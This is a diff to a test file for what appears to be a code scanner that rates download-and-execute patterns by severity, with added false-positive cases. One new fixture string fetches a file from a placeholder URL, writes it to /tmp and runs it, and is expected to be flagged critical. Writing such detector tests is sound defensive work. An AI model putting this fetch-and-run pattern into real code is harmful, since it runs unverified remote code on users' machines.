@@ -220,6 +220,19 @@ def test_js_sha256_verified_installer_is_high():
     assert sev("install.js", src) == {Severity.HIGH}
 
 
+def test_verification_elsewhere_in_the_module_does_not_lower_it():
+    src = (
+        "import hashlib, os, requests\n"
+        "def verify_release(path, want):\n"
+        "    return hashlib.sha256(open(path, 'rb').read()).hexdigest() == want\n"
+        "def run():\n"
+        f"    data = requests.get('{U}/x').content\n"
+        "    open('/tmp/agentx', 'wb').write(data)\n"
+        "    os.system('/tmp/agentx &')\n"
+    )
+    assert sev("a.py", src) == {Severity.CRITICAL}
+
+
 # ---------------------------------------------------------------- not this rule
 
 @pytest.mark.parametrize("rel,src", [
@@ -261,6 +274,26 @@ def test_js_sha256_verified_installer_is_high():
         "open('/tmp/cache/out', 'wb').write(r.content)\n"
         "subprocess.run(['ls', '/tmp/cache'])\n"
         "subprocess.run(['xdg-open', '/tmp/cache/out'])\n"
+    )),
+    # FP corpus (mcp-for-blender): a fetched file only syntax-checked with compile(), never run
+    ("a.py", (
+        "import requests\n"
+        "def check():\n"
+        f"    source = requests.get('{U}/addon.py', timeout=15).text\n"
+        "    compile(source, 'addon.py', 'exec')\n"
+        "    return source\n"
+    )),
+    # FP corpus (dbt-mcp): a listening socket's port is one argument of a local command
+    ("a.py", (
+        "import asyncio, socket\n"
+        "class C:\n"
+        "    def setup(self):\n"
+        "        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+        "        self._socket.bind(('127.0.0.1', 0))\n"
+        "        _, self.port = self._socket.getsockname()\n"
+        "    async def launch(self):\n"
+        "        cmd = [*self.cmd, '--socket', f'{self.port}']\n"
+        "        self.process = await asyncio.create_subprocess_exec(*cmd)\n"
     )),
     ("a.js", (
         "const RE = /token=(\\w+)/;\n"
